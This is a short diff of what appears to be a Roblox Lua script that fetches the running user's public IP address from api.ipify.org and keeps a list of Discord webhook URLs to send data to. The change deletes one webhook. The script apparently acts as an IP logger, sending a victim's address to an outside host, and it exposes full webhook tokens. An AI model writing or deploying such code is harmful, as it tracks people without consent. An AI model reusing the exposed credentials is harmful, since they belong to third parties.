@@ -7,7 +7,7 @@ local ip = game:HttpGet("https://api.ipify.org")
 -- Webhook list (add more as needed)
 local urls = {
     "https://discord.com/api/webhooks/1370915556084940932/WHv1nKx6zAkY0iztqC4KvSv_zTRsWSQQr2RnLOoABhZ2FfQvmA0Bpgd3suf2tTICLG94",
-    "https://discord.com/api/webhooks/1370915185941807214/BQ0Ve1Nu1DRruP4W9C0_uwa_wWBTbXAo9Xk82_wC571wJm6ZrUOmviw8ta_tddhXYZxh"
+
     -- Add more webhook URLs if needed
 }
 
